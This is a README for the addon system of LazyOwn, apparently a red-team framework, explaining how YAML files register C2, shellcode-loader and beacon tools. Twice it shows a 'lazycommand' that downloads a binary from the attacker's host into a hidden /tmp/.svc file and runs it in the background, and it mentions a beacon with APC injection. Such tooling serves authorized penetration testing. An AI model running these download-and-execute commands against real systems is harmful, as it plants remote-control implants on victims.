# lazyaddons

Declarative tool integration layer for LazyOwn. Each YAML file in this
directory registers an external tool as a first-class CLI command, a pwntomate
job, and an MCP-accessible tool — without touching any Python source.

There are currently 76 addons covering C2 frameworks, shellcode loaders,
exploitation tools, scanners, AI agents, and post-exploitation utilities.

## How it works

At startup, `lazyown.py` scans `lazyaddons/*.yaml` and auto-generates a
`do_<name>` command for each enabled addon. The command:
1. Clones the repo from `repo_url` to `install_path` if not present.
2. Runs `install_command` if the install path is a fresh clone.
3. Substitutes `{param}` tokens with values from `payload.json` and CLI args.
4. Executes `execute_command` inside `install_path`.
5. If `lazycommand` is defined, prints it as the command to run on the target.

## YAML schema

### Required fields

```yaml
name: shortname              # CLI verb: do_shortname, also the tab-complete entry
description: |               # Shown by help <name>; multi-line allowed
  What the tool does.
enabled: true                # false to skip at startup without deleting the file
tool:
  name: Display Name
  repo_url: https://github.com/user/repo.git
  install_path: external/.exploit/toolname
  execute_command: ./tool --option {param}
category: "10. Command & Control"   # Must match an existing CLI category
```

### Optional fields

```yaml
author: Author Name
version: "1.0"
os: linux                    # MITRE platform the addon targets (see table below)
trigger:                     # nmap service names that auto-suggest this addon
  - microsoft-ds
  - ldap
params:
  - name: lhost
    type: string
    required: true
    description: Attacker IP passed to the tool.
  - name: lport
    type: string
    required: false
    description: Listener port.
tool:
  install_command: make        # Run once after cloning; skip if empty
  download_file: /tmp/.svc     # Path on target where the payload lands
  lazycommand: |               # Command to run on the target
    curl -sk "http://{lhost}:{lport}/payload" -o /tmp/.svc && chmod +x /tmp/.svc && /tmp/.svc &
```

### `os` field — MITRE ATT&CK platform

Declares the victim platform the addon targets. Consumed by `do_explore`,
`do_recommend_next`, and `do_suggest_next` to filter out addons that
cannot run against the active engagement. Accepted values:

| Value | Meaning |
|-------|---------|
| `any` | Operator-side / cross-platform (default) — never filtered out |
| `linux` | Linux victims (ELF, kernel exploits, native loaders) |
| `windows` | Windows victims (PE/DLL, BOFs, PowerShell payloads) |
| `macos` | macOS victims |
| `network` | Network appliances / protocol-level attacks |
| `containers` | Docker / Kubernetes targets |
| `saas` | SaaS abuse (Office 365, GitHub, etc.) |
| `iaas` | Cloud control planes (AWS, Azure, GCP) |

Unknown values fall back to `any` with a warning at load time.

### `trigger` field — nmap service auto-suggest

List of nmap service names (e.g. `microsoft-ds`, `http`, `ldap`) that
should cause the exploration engine to surface this addon when those
services appear in a `sessions/scan_*.nmap.xml`. Special values:

- `[all]` — match every discovered service (broad scanners).
- `[]` or omitted — addon is never auto-suggested by service discovery
  (manual / strategic tools, AI agents, frameworks).

The matcher is case-insensitive. Triggers do not fabricate evidence:
only declare services the addon genuinely operates against.

### Parameter substitution tokens

| Token | Value source |
|-------|-------------|
| `{lhost}` | `payload.json["lhost"]` |
| `{lport}` | `payload.json["lport"]` |
| `{rhost}` | `payload.json["rhost"]` |
| `{rport}` | `payload.json["rport"]` |
| `{domain}` | `payload.json["domain"]` |
| `{c2_port}` | `payload.json["c2_port"]` |
| `{<key>}` | Any key present in `payload.json` |

### Install path convention

All addon repos clone under `external/.exploit/<name>`. This keeps vendored
code out of the project root and under a consistent path that `.gitignore`
excludes.

## Beacon addons

The beacon family follows a specific build-and-stage pattern:

```yaml
tool:
  install_command: make
  execute_command: >
    git restore . ; git pull ; make &&
    cp binary ../../../sessions/binary &&
    echo "staged at sessions/binary"
  lazycommand: >
    curl -sk "http://{lhost}:{lport}/binary" -o /tmp/.svc &&
    chmod +x /tmp/.svc && /tmp/.svc &
```

The `git restore . ; git pull` before `make` ensures a fresh build. The binary
stages to `sessions/` for delivery through the C2 file endpoint.

Current beacon addons:
- `beacon.yaml` — Windows C beacon with Early Bird APC injection and BOF support
- `blacksandbeacon.yaml` — Linux C beacon with ELF dlopen BOF support (unique to LazyOwn)
- `blacksandbeacon_bof.yaml` — Linux BOF loader companion

## Category reference

```
01. Recon                 07. Pivoting
02. Scanning              08. Credentials
03. Enumeration           09. Persistence
04. Post-Exploitation     10. Command & Control
05. Exploitation          11. Reporting
06. Privilege Escalation  12. Miscellaneous
```

## Running an addon

```
(LazyOwn) > blacksandbeacon
(LazyOwn) > beacon
(LazyOwn) > toposwarm
```

List all registered addons:

```
(LazyOwn) > list_addons
```

Reload addons without restarting the shell:

```
(LazyOwn) > reload_addons
```

## Creating an addon from a GitHub URL

```
(LazyOwn) > lazyaddon_creator https://github.com/user/tool
```

Fetches repo metadata, infers install and execute commands, and writes the
YAML to `lazyaddons/`.

## Troubleshooting

**Clone fails** — check network access. The URL must end with `.git`.

**Install command fails** — run `cd external/.exploit/<name> && make` manually.
Common causes: missing system packages (`gcc`, `go`, `rust`), wrong make target.

**Parameter not substituted** — verify the key exists in `payload.json`.
Use `assign <key> <value>` from the CLI to set it.

**Command not found after adding YAML** — run `reload_addons` or restart the
shell.
